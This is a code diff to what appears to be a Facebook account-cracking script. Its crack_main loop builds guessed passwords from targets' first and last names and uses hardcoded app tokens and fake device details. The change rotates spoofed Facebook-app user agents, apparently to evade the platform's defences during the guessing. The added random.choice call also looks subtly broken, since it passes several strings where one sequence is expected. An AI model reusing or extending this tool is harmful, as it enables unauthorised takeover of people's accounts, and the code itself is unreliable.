@@ -380,6 +380,7 @@ class crack_main():
                         except:
                                 ln = fn
                         for pw in passlist:
+                                zee = random.choice('Mozilla/5.0 (Linux; Android 10; 721 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/306.0.0.13.107;],Mozilla/5.0 (Linux; Android 11; N5502L Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.17.108;]','Mozilla/5.0 (Linux; Android 10; PULSE_1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/305.0.0.12.106;]','Mozilla/5.0 (Linux; Android 10; R1PLUS_1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/330.0.0.10.108;]','Mozilla/5.0 (Linux; Android 10; Hisense Infinity H40 Lite Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/244.0.0.6.117;]')
                                 pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                 infos = open('device_info.txt','r').read()
                                 try:
@@ -390,7 +391,7 @@ class crack_main():
                                         brand_name_ = "Infinix"
                                         width_ = "720"
                                         height_ = "1280"
-                                uas = 'Dalvik/2.1.0 (Linux; U; Android '+str(random.randint(8,12))+'.0.0; Infinix Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix;FBSV/'+str(random.randint(8,12))+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1280};]'
+                                uas = zee
                                 fak_tn="153779441997719|n2YEBqamkrdDYJBUkjxmNzuZS5c","300340197101744|lGCTj7yrAEvAWivDSvcBOJXu-Lw"
                                 adid = str(uuid.uuid4())
                                 abhi = "779441997719|n2YE"
